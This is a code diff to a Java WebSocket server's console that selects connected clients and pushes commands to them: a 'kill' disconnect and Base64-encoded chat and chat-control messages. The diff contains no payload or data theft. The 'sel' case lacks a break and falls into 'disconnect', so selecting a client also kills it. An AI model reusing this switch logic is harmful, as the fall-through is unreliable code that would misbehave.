@@ -6,17 +6,20 @@ import org.java_websocket.WebSocket;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.List;
 
 public class Main {
 
     static List<WebSocket> connCollection;
 
+    @SuppressWarnings("InfiniteLoopStatement")
     public static void main(String[] args) throws IOException {
         Server server = new Server(11451);
         server.start();
-        System.out.println("端口: " + server.getPort());
+        server.log("端口: " + server.getPort());
         BufferedReader inputStream = new BufferedReader(new InputStreamReader(System.in));
         while (true) {
             String in = inputStream.readLine();
@@ -29,11 +32,11 @@ public class Main {
                             break;
                         case "conn":
                             if (msgArr.length == 1) {
-                                System.out.println("----CONNECTIONS----");
+                                server.log("----CONNECTIONS----");
                                 server.getConnections().forEach(conn -> {
                                     int index = conn.<Integer>getAttachment();
                                     String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
-                                    System.out.printf("IP: %s, ID: %s%n", address, index);
+                                    server.log(String.format("IP: %s, ID: %s%n", address, index));
                                 });
                             } else {
                                 connCollection = new ArrayList<>();
@@ -41,12 +44,25 @@ public class Main {
                                     case "sel":
                                         if (msgArr.length == 3) {
                                             server.getConnections().stream().filter(conn -> conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2])).forEach(conn -> connCollection.add(conn));
-                                            System.out.println("Selected client!");
+                                            server.log("Selected client!");
+                                        }
+                                    case "disconnect":
+                                        if (msgArr.length == 3) {
+                                            server.getConnections().stream().filter(conn -> conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2])).forEach(conn -> conn.send("kill"));
+                                            server.log("Client " + msgArr[2] + " disconnected");
                                         }
                                     default:
                                         break;
                                 }
                             }
+                            break;
+                        case "chat":
+                        case "chat_control":
+                        case "chat_filter":
+                            if (msgArr.length < 2) break;
+                            String[] strArr = new String[msgArr.length - 1];
+                            System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
+                            server.broadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)), connCollection);
                             break;
                         default:
                             server.broadcast(in, connCollection);
